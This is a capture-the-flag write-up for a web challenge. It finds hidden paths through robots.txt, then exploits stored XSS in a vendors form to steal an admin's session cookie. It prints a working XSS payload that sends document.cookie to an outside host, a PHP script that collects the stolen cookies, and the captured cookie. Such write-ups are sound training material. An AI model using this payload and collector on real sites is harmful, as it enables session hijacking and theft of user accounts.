# Wallowing Wallabies (Web, 25pts)

## Problem

Wallowing Wallabies provides enterprise contract management - we'd like to find out how easy it is to perform corporate espionage against them. 

## Solution


We've got web page with no visible navigation or form except Home page:

![Wallowing Wallabies]
(assets/1.png)

Quick look at _robots.txt_ reveals some hidden content:

```

User-agent: *
Disallow: /deep-blue-sea/
Disallow: /deep-blue-sea/team/
# Yes, these are alphabet puns :)
Disallow: /deep-blue-sea/team/characters
Disallow: /deep-blue-sea/team/paragraphs
Disallow: /deep-blue-sea/team/lines
Disallow: /deep-blue-sea/team/runes
Disallow: /deep-blue-sea/team/vendors

```

Web page at _/deep-blue-sea/team/vendors_ contains form with two fields:

![Wallowing Wallabies]
(assets/2.png)

Text field was vulnerable to XSS and allows to put payload with simple JavaScript to steal cookie:

```HTML

<script src="bootstrap.min.js">
</script>
<script>document.write('<img src="http://sword.x10host.com/?c='+document.cookie+'"/>');
</script>

```

This payload was saved in message sent to site admin.
At _http://sword.x10host.com/_ simple PHP script saves stolen cookie:

```PHP
<?php

if (isset($_GET["c"])) {
	$cookie = $_GET["c"];
	file_put_contents("cookies.txt", $cookie);
}

```

After a couple of minutes someone "read" message and _cookies.txt_ file on _sword.x10host.com_ contains cookie:

```
green-mountains=eyJub25jZSI6ImUxNjgwMjcyYTcxNDE3MjMiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vdmVuZG9ycy4qJCIsImV4cGlyeSI6MTQ2MjAzMTg2OH0=|1462031865|d985a99f12846cd73da3b9b01b3b921fd15512e3
```

![Wallowing Wallabies]
(assets/3.png)

Refresh of Wallowing Wallabies page with stolen cookie revealed the flag:

![Wallowing Wallabies]
(assets/4.png)

